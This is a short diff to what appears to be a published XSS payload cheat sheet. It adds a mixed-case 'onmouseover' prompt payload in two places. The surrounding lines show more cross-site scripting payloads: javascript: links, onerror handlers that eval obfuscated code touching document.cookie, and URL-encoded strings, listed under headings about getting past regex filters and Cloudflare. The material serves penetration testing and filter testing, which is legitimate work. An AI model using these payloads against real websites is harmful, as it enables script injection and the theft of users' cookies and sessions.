@@ -59,6 +59,7 @@ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
 <input disabled=disabled onbeforecopy=alert(1) value=copyme>
 </textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
 </script><script>alert('xElkomy')</script>
+OnMoUsEoVeR=prompt(/hacked/)//
 ```
 
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
@@ -81,6 +82,7 @@ window&&=(window&&=opener||=alert)?.(1??0,)
 ```js
 %22%3Cimg%2F**%2Fsrc%3D%22x%22%2F**%2Fonx%3D%22%22%2F**%2Fonerror%3D%22alert%60xss%60%22%3Ef9y60 --encoded
 "<img/**/src="x"/**/onx=""/**/onerror="alert`xss`">f9y60 --decoded
+OnMoUsEoVeR=prompt(/hacked/)//
 ```
 
 ## Clourflare XSS bypass
